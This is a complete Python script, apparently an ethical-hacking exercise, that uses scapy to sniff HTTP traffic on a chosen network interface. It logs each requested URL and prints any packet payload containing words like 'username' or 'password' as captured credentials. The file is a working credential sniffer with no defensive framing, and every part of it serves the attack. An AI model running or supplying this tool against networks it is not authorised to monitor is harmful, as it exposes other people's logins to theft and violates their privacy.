#!/usr/bin/env python3
import scapy.all as scapy
from scapy.layers.http import HTTPRequest  # Ensure HTTPRequest is imported


def sniff(interface):
    """Sniff packets on the specified interface."""
    print(f"[*] Starting packet sniffing on interface: {interface}")
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    """Extract the URL from the HTTP Request."""
    return packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()


def get_login_info(packet):
    """Extract possible login information from raw data."""
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        try:
            load = load.decode('utf-8', errors='ignore')  # Decode byte string
        except Exception:
            return None
        keywords = ['username', 'user', 'login', 'password', 'pass']
        for keyword in keywords:
            if keyword in load:
                return load
    return None


def process_sniffed_packet(packet):
    """Process each sniffed packet."""
    if packet.haslayer(HTTPRequest):
        url = get_url(packet)
        print(f'[+] HTTP Request >> {url}')

        login_info = get_login_info(packet)
        if login_info:
            print(f'\n\n[+] Possible Username / Password >> {login_info}\n\n')


if __name__ == "__main__":
    # Prompt the user for the network interface
    interface = input("Enter the network interface to sniff (e.g., eth0, wlan0,wlo1): ").strip()

    # Start sniffing on the specified interface
    try:
        sniff(interface)
    except PermissionError:
        print("[!] Permission denied. Please run the script with elevated privileges (e.g., sudo).")
    except Exception as e:
        print(f"[!] An error occurred: {e}")
